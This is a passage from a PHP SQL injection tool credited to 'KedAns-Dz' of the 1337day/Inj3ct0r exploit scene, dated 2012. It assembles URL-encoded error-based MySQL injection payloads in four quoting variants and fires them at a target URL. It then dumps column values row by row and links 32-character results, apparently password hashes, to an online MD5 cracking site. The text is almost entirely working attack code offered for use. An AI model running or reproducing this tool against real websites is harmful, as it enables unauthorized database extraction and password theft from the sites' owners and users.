 @$datas = "$url+%20AND%20%28SELECT%207656%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20".GetBetween($databas,$start1,$end2).".$dz%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29";
}elseif($mode_eb==4){
@$datas = "$url+%29%20AND%20%28SELECT%207656%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20".GetBetween($databas,$start1,$end2).".$dz%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287609%3D7609";
}


@$dato = @file_get_contents("$datas");


	$i = -1;
	
	echo "<table>";
	
	while ($i <= (GetBetween($dato)-1)):
			if($mode_eb == 1){
	@$_data = "%27%20AND%20%28SELECT%206968%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28$num3%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20".GetBetween($databas).".$dz%20LIMIT%20$i%2C1%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27MEpR%27%3D%27MEpR";
	}elseif($mode_eb == 2){
	             
			@$_data = "%27%29%20AND%20%28SELECT%206968%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28$num3%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20".GetBetween($databas).".$dz%20LIMIT%20$i%2C1%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27ffAM%27%3D%27ffAM";
	}elseif($mode_eb == 3){
			@$_data = "%20AND%20%28SELECT%206968%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28$num3%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20".GetBetween($databas).".$dz%20LIMIT%20$i%2C1%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29";
	}elseif($mode_eb == 4){
			@$_data = "%29%20AND%20%28SELECT%206968%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6f79753a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28$num3%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20".GetBetween($databas).".$dz%20LIMIT%20$i%2C1%29%2C0x3a70687a3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287609%3D7609";
	}
		
	$datas2 = "$url+$_data";
	$data2 = file_get_contents("$datas2");
	$num4 = GetBetween($data2);
	if(strlen($num4) == 32){
	echo "<tr><td>$num4</td><td><div OnClick=\"window.open('http://www.hashchecker.de/$num4')\" style=\"color: blue\">MD5</div></td></tr>";
	}else{
	echo "<tr><td>$num4</td><td>";
	}
	$i++;
	endwhile;
	
 //}

echo "</table>";
echo "<table border=0 width=400 align=center><tr><Td><center><p style='font-size: 10pt;'>";
echo "<b>KedAns-Dz | 1337day.com * dis9.com | Made in Algeria</br></b></td></tr>";
echo "</center>";
}
}

/*

Copycenter (.) | KedAns-Dz | (Inj3ct0r 1337day.com | Dis9 UE dis9.com)

... Algeria - Hassi messaoud (30500) in 20/02/2012 - 22:34 ...

*/
?>